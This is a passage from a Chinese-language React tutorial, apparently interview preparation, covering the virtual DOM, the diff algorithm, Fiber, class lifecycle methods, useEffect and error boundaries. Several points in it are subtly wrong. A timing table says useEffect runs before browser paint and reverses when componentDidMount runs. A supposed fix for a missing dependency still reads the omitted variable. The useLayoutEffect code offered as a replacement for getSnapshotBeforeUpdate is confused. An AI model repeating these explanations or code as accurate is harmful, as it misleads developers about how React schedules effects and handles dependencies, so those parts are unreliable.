核心机制"></a>第二章：React 核心机制</h1><h2 id="2-1-虚拟-DOM-与-Diff-算法（Reconciliation）"><a href="#2-1-虚拟-DOM-与-Diff-算法（Reconciliation）" class="headerlink" title="2.1 虚拟 DOM 与 Diff 算法（Reconciliation）"></a>2.1 虚拟 DOM 与 Diff 算法（Reconciliation）</h2><h3 id="基础概念概述-3"><a href="#基础概念概述-3" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><ul><li>虚拟 DOM (Virtual DOM)：<ul><li>JavaScript 对象表示的 DOM 副本</li><li>轻量化的内存数据结构</li><li>与实际 DOM 结构一一对应</li></ul></li><li>Diff 算法 (Reconciliation)：<ul><li>React 比较新旧虚拟 DOM 差异的算法</li><li>时间复杂度优化到 O(n)</li><li>生成最小化 DOM 操作指令</li></ul></li></ul><h3 id="虚拟-DOM-核心原理"><a href="#虚拟-DOM-核心原理" class="headerlink" title="虚拟 DOM 核心原理"></a>虚拟 DOM 核心原理</h3><p><strong>虚拟 DOM 结构示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 实际 JSX</span><br>&lt;div className=<span class="hljs-string">&quot;container&quot;</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>Hello React<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">List</span> <span class="hljs-attr">items</span>=<span class="hljs-string">&#123;items&#125;</span> /&gt;</span></span><br>&lt;/div&gt;<br><br><span class="hljs-comment">// 对应的虚拟 DOM 对象</span><br>&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;div&#x27;</span>,<br>  <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">className</span>: <span class="hljs-string">&#x27;container&#x27;</span> &#125;,<br>  <span class="hljs-attr">children</span>: [<br>    &#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;h1&#x27;</span>,<br>      <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;title&#x27;</span> &#125;,<br>      <span class="hljs-attr">children</span>: <span class="hljs-string">&#x27;Hello React&#x27;</span><br>    &#125;,<br>    &#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-title class_">List</span>,  <span class="hljs-comment">// 组件类型</span><br>      <span class="hljs-attr">props</span>: &#123; items &#125;,<br>      <span class="hljs-comment">// ... 内部有独立虚拟 DOM 树</span><br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>虚拟 DOM 工作流程</strong></p><pre class="mermaid">graph LRA[组件状态变化] --> B[创建新虚拟 DOM 树]B --> C[Diff 算法比较新旧树]C --> D[生成 DOM 补丁包]D --> E[批量更新真实 DOM]</pre><p><strong>虚拟 DOM 性能优势</strong></p><table><thead><tr><th align="left">操作</th><th align="left">直接操作 DOM</th><th align="left">虚拟 DOM 方案</th></tr></thead><tbody><tr><td align="left">更新 10 节点</td><td align="left">10 次 DOM 操作</td><td align="left">1 次 Diff + 1 次更新</td></tr><tr><td align="left">跨平台能力</td><td align="left">依赖浏览器 API</td><td align="left">抽象渲染层</td></tr><tr><td align="left">复杂更新</td><td align="left">手动优化难度大</td><td align="left">自动批量处理</td></tr></tbody></table><h3 id="Diff-算法深度解析（O-n-优化策略）"><a href="#Diff-算法深度解析（O-n-优化策略）" class="headerlink" title="Diff 算法深度解析（O(n) 优化策略）"></a>Diff 算法深度解析（O(n) 优化策略）</h3><p><strong>算法三大设计原则</strong></p><p>(1) 同级比较：只比较同一层级的节点，不跨级比较</p><pre class="mermaid">graph TDA[旧树] --> B[节点A]A --> C[节点B]D[新树] --> E[节点A']D --> F[节点B']B -->|比较| EC -->|比较| F</pre><p>(2) 类型差异直接替换：节点类型不同时直接卸载整棵子树</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 旧：&lt;div&gt;&lt;ComponentA /&gt;&lt;/div&gt;</span><br><span class="hljs-comment">// 新：&lt;span&gt;&lt;ComponentB /&gt;&lt;/span&gt;</span><br><span class="hljs-comment">// React 操作：卸载整个 div 及子组件，创建 span 和 ComponentB</span><br></code></pre></td></tr></table></figure><p>(3) Key 属性优化列表：列表项使用 key 标识身份，减少节点移动开销</p><p><strong>列表 Diff 的 key 机制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 旧列表</span><br>&lt;ul&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;b&quot;</span>&gt;</span>B<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;c&quot;</span>&gt;</span>C<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br>&lt;/ul&gt;<br><br><span class="hljs-comment">// 新列表（删除B，新增D）</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;c&quot;</span>&gt;</span>C<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;d&quot;</span>&gt;</span>D<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>Diff 过程：</p><ul><li>通过 key 匹配新旧节点：a→a, c→c</li><li>删除 key&#x3D;”b” 的节点</li><li>新增 key&#x3D;”d” 的节点</li><li>复用 key&#x3D;”a” 和 “c” 的节点</li></ul><p><strong>节点复用策略</strong></p><table><thead><tr><th align="left">场景</th><th align="left">操作</th><th align="left">性能影响</th></tr></thead><tbody><tr><td align="left">相同类型 DOM 元素</td><td align="left">更新属性</td><td align="left">高效</td></tr><tr><td align="left">相同类型组件元素</td><td align="left">触发更新（不卸载）</td><td align="left">保留组件状态</td></tr><tr><td align="left">不同类型元素</td><td align="left">卸载整棵子树</td><td align="left">成本较高</td></tr></tbody></table><h3 id="React-Fiber-架构与可中断渲染"><a href="#React-Fiber-架构与可中断渲染" class="headerlink" title="React Fiber 架构与可中断渲染"></a>React Fiber 架构与可中断渲染</h3><p><strong>传统 Diff 算法局限</strong></p><ul><li>递归遍历：无法中断长时间任务</li><li>阻塞主线程：导致动画卡顿</li></ul><p><strong>Fiber 架构核心改进</strong></p><pre class="mermaid">graph LRA[同步递归] --> B[可中断异步任务]C[虚拟DOM树] --> D[Fiber链表结构]</pre><p>Fiber 节点结构：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;div&#x27;</span>,          <span class="hljs-comment">// 节点类型</span><br>  <span class="hljs-attr">key</span>: <span class="hljs-literal">null</span>,            <span class="hljs-comment">// 唯一标识</span><br>  <span class="hljs-attr">return</span>: parentFiber,  <span class="hljs-comment">// 父节点</span><br>  <span class="hljs-attr">child</span>: firstChild,    <span class="hljs-comment">// 第一个子节点</span><br>  <span class="hljs-attr">sibling</span>: nextSibling, <span class="hljs-comment">// 兄弟节点</span><br>  <span class="hljs-attr">alternate</span>: oldFiber,  <span class="hljs-comment">// 指向旧树对应节点</span><br>  <span class="hljs-attr">effectTag</span>: <span class="hljs-string">&#x27;UPDATE&#x27;</span>,  <span class="hljs-comment">// 需要执行的副作用</span><br>  <span class="hljs-comment">// ... 其他元数据</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>双缓存机制（Current 树与 WorkInProgress 树）</strong></p><pre class="mermaid">graph LRA[当前显示] -->|Current 树| B[用户界面]C[正在构建] -->|WorkInProgress 树| D[内存中]B -->|渲染完成| C</pre><ul><li>无闪烁更新：直接切换树引用</li><li>安全回滚：中断时丢弃未完成树</li></ul><h3 id="高频面试题与破解方案-1"><a href="#高频面试题与破解方案-1" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么列表渲染需要 key？key 可以随机数吗？</strong></p><ul><li>key 帮助 React 识别元素身份，减少不必要的销毁&#x2F;重建</li><li>禁止使用随机数：每次渲染 key 变化导致全量重建</li><li>推荐方案：稳定 ID（如数据 id）或索引（仅静态列表）</li></ul><p><strong>Q：虚拟 DOM 一定比直接操作 DOM 快吗？</strong></p><p>辩证回答：</p><ul><li>初始渲染：虚拟 DOM 需要额外创建对象，稍慢</li><li>复杂更新：虚拟 DOM 通过 Diff 减少操作次数，更快</li><li>综合优势：<ul><li>跨平台能力（React Native）</li><li>声明式编程体验</li><li>自动批处理优化</li></ul></li></ul><p><strong>Q：React 如何实现 O(n) 复杂度的 Diff？</strong></p><p>算法原理：</p><ul><li>仅同层比较（深度优先遍历）</li><li>类型不同时跳过子树比较</li><li>列表使用 key 匹配减少移动开销</li></ul><h3 id="性能优化技巧"><a href="#性能优化技巧" class="headerlink" title="性能优化技巧"></a>性能优化技巧</h3><p><strong>避免不必要节点变动</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 每次渲染创建新对象（导致子组件重渲染）</span><br>&lt;<span class="hljs-title class_">Child</span> style=&#123;&#123; <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;red&#x27;</span> &#125;&#125; /&gt;<br><br><span class="hljs-comment">// ✅ 提取静态对象</span><br><span class="hljs-keyword">const</span> staticStyle = &#123; <span class="hljs-attr">color</span>: <span class="hljs-string">&#x27;red&#x27;</span> &#125;;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;staticStyle&#125;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>列表渲染优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 索引作为 key（列表变化时状态错乱）</span><br>&#123;todos.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">todo, index</span>) =&gt;</span> <br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;index&#125;</span> <span class="hljs-attr">todo</span>=<span class="hljs-string">&#123;todo&#125;</span> /&gt;</span></span><br>)&#125;<br><br><span class="hljs-comment">// ✅ 稳定 ID 作为 key</span><br>&#123;todos.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> <br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span> <span class="hljs-attr">todo</span>=<span class="hljs-string">&#123;todo&#125;</span> /&gt;</span></span><br>)&#125;<br></code></pre></td></tr></table></figure><p><strong>组件树结构优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ❌ 深层嵌套导致 Diff 范围大</span><br>&lt;<span class="hljs-title class_">App</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Header</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">UserPanel</span>&gt;</span>  // 状态变化影响整个 Header</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserPanel</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Header</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">App</span>&gt;<br><br><span class="hljs-comment">// ✅ 状态下沉 + 组件提权</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">UserPanel</span>&gt;</span>   // 独立更新</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">UserPanel</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">App</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="React-18-并发渲染优化"><a href="#React-18-并发渲染优化" class="headerlink" title="React 18 并发渲染优化"></a>React 18 并发渲染优化</h3><p><strong>可中断渲染</strong></p><pre class="mermaid">graph LRA[高优先级更新] --> B[中断当前渲染]B --> C[执行紧急任务]C --> D[恢复渲染]</pre><p><strong>自动批处理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React 17：仅事件处理函数内批处理</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);<br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 两次独立更新</span><br>&#125;, <span class="hljs-number">100</span>);<br><br><span class="hljs-comment">// React 18：所有更新自动批处理</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-number">1</span>);   <span class="hljs-comment">// 合并为一次更新</span><br>  <span class="hljs-title function_">setFlag</span>(<span class="hljs-literal">true</span>);<br>&#125;, <span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><h2 id="2-2-生命周期（类组件生命周期、useEffect-替代方案）"><a href="#2-2-生命周期（类组件生命周期、useEffect-替代方案）" class="headerlink" title="2.2 生命周期（类组件生命周期、useEffect 替代方案）"></a>2.2 生命周期（类组件生命周期、useEffect 替代方案）</h2><h3 id="类组件生命周期全景图"><a href="#类组件生命周期全景图" class="headerlink" title="类组件生命周期全景图"></a>类组件生命周期全景图</h3><pre class="mermaid">graph TD  A[挂载阶段] --> B[constructor]  B --> C[static getDerivedStateFromProps]  C --> D[render]  D --> E[componentDidMount]    F[更新阶段] --> G[static getDerivedStateFromProps]  G --> H[shouldComponentUpdate]  H --> I[render]  I --> J[getSnapshotBeforeUpdate]  J --> K[componentDidUpdate]    L[卸载阶段] --> M[componentWillUnmount]    N[错误处理] --> O[static getDerivedStateFromError]  O --> P[componentDidCatch]</pre><p>各阶段核心方法：</p><table><thead><tr><th align="left">阶段</th><th align="left">方法</th><th align="left">执行时机</th><th align="left">常见用途</th></tr></thead><tbody><tr><td align="left">挂载</td><td align="left">constructor</td><td align="left">组件初始化</td><td align="left">初始化 state，绑定 this</td></tr><tr><td align="left">挂载</td><td align="left">render</td><td align="left">创建虚拟 DOM</td><td align="left">返回 JSX 内容</td></tr><tr><td align="left">挂载</td><td align="left">componentDidMount</td><td align="left">DOM 挂载完成</td><td align="left">网络请求、订阅事件</td></tr><tr><td align="left">更新</td><td align="left">shouldComponentUpdate</td><td align="left">渲染前拦截</td><td align="left">性能优化（返回 false 阻止更新）</td></tr><tr><td align="left">更新</td><td align="left">getSnapshotBeforeUpdate</td><td align="left">DOM 更新前</td><td align="left">获取滚动位置等 DOM 信息</td></tr><tr><td align="left">更新</td><td align="left">componentDidUpdate</td><td align="left">DOM 更新完成</td><td align="left">基于新 DOM 操作</td></tr><tr><td align="left">卸载</td><td align="left">componentWillUnmount</td><td align="left">组件卸载前</td><td align="left">清理定时器、取消订阅</td></tr><tr><td align="left">错误</td><td align="left">componentDidCatch</td><td align="left">子组件抛出错误</td><td align="left">错误日志、显示降级 UI</td></tr></tbody></table><h3 id="函数组件-useEffect-替代方案"><a href="#函数组件-useEffect-替代方案" class="headerlink" title="函数组件 useEffect 替代方案"></a>函数组件 useEffect 替代方案</h3><p>生命周期映射关系：</p><pre class="mermaid">graph LR  A[componentDidMount] --> B["useEffect(() => {}, [])"]  C[componentDidUpdate] --> D["useEffect(() => {}, [deps])"]  E[componentWillUnmount] --> F["useEffect(() => { return cleanup }, [])"]  G[shouldComponentUpdate] --> H[React.memo 或 useMemo]</pre><h3 id="核心机制深度解析-1"><a href="#核心机制深度解析-1" class="headerlink" title="核心机制深度解析"></a>核心机制深度解析</h3><p><strong>useEffect 执行时机</strong></p><table><thead><tr><th align="left">方法</th><th align="left">执行阶段</th><th align="left">是否阻塞渲染</th><th align="left">访问 DOM</th></tr></thead><tbody><tr><td align="left">componentDidMount</td><td align="left">浏览器绘制后</td><td align="left">是</td><td align="left">可访问</td></tr><tr><td align="left">componentDidUpdate</td><td align="left">浏览器绘制后</td><td align="left">是</td><td align="left">可访问</td></tr><tr><td align="left">useEffect</td><td align="left">浏览器绘制前</td><td align="left">否（异步）</td><td align="left">可访问（但需注意时机）</td></tr><tr><td align="left">useLayoutEffect</td><td align="left">DOM 变更后，绘制前</td><td align="left">是（同步）</td><td align="left">可访问</td></tr></tbody></table><p><strong>依赖数组精妙之处</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ✅ 安全：包含所有依赖</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> total = price * quantity;<br>  <span class="hljs-title function_">setTotal</span>(total);<br>&#125;, [price, quantity]); <br><br><span class="hljs-comment">// ❌ 危险：缺少依赖（使用过期状态）</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> total = price * quantity;<br>  <span class="hljs-title function_">setTotal</span>(total);<br>&#125;, [price]); <span class="hljs-comment">// 缺少 quantity</span><br><br><span class="hljs-comment">// ✅ 解决方案：函数式更新</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setTotal</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> price * quantity);<br>&#125;, [price]); <span class="hljs-comment">// 不再依赖 quantity</span><br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-2"><a href="#高频面试题与破解方案-2" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么 useEffect 可能执行两次？</strong></p><p>React 18+ 严格模式行为：</p><ul><li>开发环境下故意双调用：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">React</span>.<span class="hljs-property">StrictMode</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span> &#123;<span class="hljs-comment">/* useEffect 挂载/卸载各执行两次 */</span>&#125;<br>&lt;/<span class="hljs-title class_">React</span>.<span class="hljs-property">StrictMode</span>&gt;<br></code></pre></td></tr></table></figure><ul><li>目的：检测不纯渲染（例如未正确实现清理）</li><li>解决方案：确保清理函数完全复原初始状态</li></ul><p><strong>Q：如何替代 shouldComponentUpdate？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 方案1：React.memo 浅比较</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; data &#125;</span>) =&gt;</span> &#123; ... &#125;);<br><br><span class="hljs-comment">// 方案2：自定义比较</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<br>  <span class="hljs-function">(<span class="hljs-params">&#123; data &#125;</span>) =&gt;</span> &#123; ... &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">prevProps, nextProps</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> prevProps.<span class="hljs-property">id</span> === nextProps.<span class="hljs-property">id</span>; <span class="hljs-comment">// 自定义比较逻辑</span><br>  &#125;<br>);<br><br><span class="hljs-comment">// 方案3：useMemo 控制子组件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> memoizedChild = <span class="hljs-title function_">useMemo</span>(<br>    <span class="hljs-function">() =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;complexData&#125;</span> /&gt;</span></span>,<br>    [complexData] <span class="hljs-comment">// 仅 complexData 变化时重建</span><br>  );<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;memoizedChild&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：getSnapshotBeforeUpdate 如何替代？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 类组件</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ScrollList</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">getSnapshotBeforeUpdate</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">scrollHeight</span>;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidUpdate</span>(<span class="hljs-params">prevProps, prevState, snapshot</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">scrollTop</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">scrollHeight</span> - snapshot;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 函数组件：useLayoutEffect + useRef</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ScrollList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> listRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> lastScrollHeight = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// DOM 更新后，绘制前执行（类似 getSnapshotBeforeUpdate）</span><br>    lastScrollHeight.<span class="hljs-property">current</span> = listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollHeight</span>;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// 清理阶段相当于 getSnapshotBeforeUpdate</span><br>      <span class="hljs-keyword">const</span> snapshot = listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollHeight</span>;<br>      listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollTop</span> += listRef.<span class="hljs-property">current</span>.<span class="hljs-property">scrollHeight</span> - lastScrollHeight.<span class="hljs-property">current</span>;<br>    &#125;;<br>  &#125;, [items]);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="错误边界（Error-Boundaries）特殊说明"><a href="#错误边界（Error-Boundaries）特殊说明" class="headerlink" title="错误边界（Error Boundaries）特殊说明"></a>错误边界（Error Boundaries）特殊说明</h3><p><strong>类组件专属能力</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  state = &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span> &#125;;<br>  <br>  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params">error</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span> &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, info</span>) &#123;<br>    <span class="hljs-title function_">logErrorToService</span>(error, info.<span class="hljs-property">componentStack</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span 